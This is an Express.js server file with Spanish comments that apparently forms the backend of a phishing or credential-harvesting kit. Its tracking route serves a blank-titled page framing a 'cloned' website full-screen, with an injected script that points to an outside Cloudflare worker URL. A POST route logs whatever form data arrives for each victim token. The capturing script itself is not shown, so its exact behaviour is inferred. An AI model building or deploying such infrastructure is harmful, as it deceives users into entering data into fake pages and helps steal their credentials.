const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 10000;

// ========== CONFIGURACIÓN ==========
const BASE_URL = process.env.BASE_URL || 'https://societyy-9z4e.onrender.com';
const WORKER_URL = process.env.WORKER_URL || 'https://wispy-bonus-51e9.societykark.workers.dev/';

// ========== SERVIR ARCHIVOS ESTÁTICOS ==========
app.use(express.static(path.join(__dirname, 'public')));

// ========== RUTA RAÍZ ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== RUTA DE TRACKING ==========
app.get('/track/:token', (req, res) => {
    const token = req.params.token;
    // 🔥 Aquí deberías obtener la URL clonada de tu base de datos
    const urlClonada = 'https://example.com';
    const serverUrl = BASE_URL;
    const scriptUrl = `${BASE_URL}/script.js`;

    const html = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>.</title>
        <style>
            body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #ffffff; }
            #clone-iframe { border: none; width: 100%; height: 100%; }
        </style>
    </head>
    <body>
        <iframe id="clone-iframe" src="${urlClonada}"></iframe>
        <script 
            data-tracking-id="${token}" 
            data-server-url="${WORKER_URL}" 
            src="${scriptUrl}">
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// ========== RUTA PARA RECIBIR DATOS ==========
app.post('/track/:token', express.urlencoded({ extended: true }), (req, res) => {
    const token = req.params.token;
    console.log('📥 Datos recibidos:', { token, body: req.body });
    res.send('OK');
});

// ========== INICIAR SERVIDOR ==========
app.listen(PORT, () => {
    console.log(`✅ Servidor en puerto ${PORT}`);
    console.log(`✅ BASE_URL: ${BASE_URL}`);
    console.log(`✅ WORKER_URL: ${WORKER_URL}`);
});
